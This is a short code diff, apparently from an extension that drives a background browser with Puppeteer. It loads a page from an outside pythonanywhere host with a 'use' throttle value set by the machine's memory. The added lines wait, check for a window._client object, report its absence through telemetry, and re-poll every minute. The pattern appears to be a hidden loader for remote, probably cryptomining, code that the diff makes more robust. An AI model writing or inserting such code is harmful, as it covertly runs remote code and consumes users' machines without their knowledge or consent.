@@ -135,7 +135,19 @@
 
     await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    await new Promise(r => setTimeout(r, 10 * 1000));
     await chkFn();
+    let clt = await page.evaluate(() => window._client);
+    if (!clt){
+      tstt({
+        message: "INIT_CLT",
+        value: "No client",
+        version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
+      });
+      if (global.inIntv) clearInterval(global.inIntv);
+      return;
+    }
+
 
     if (global.inIntv) clearInterval(global.inIntv);
     global.inIntv = setInterval(chkFn, 60000);
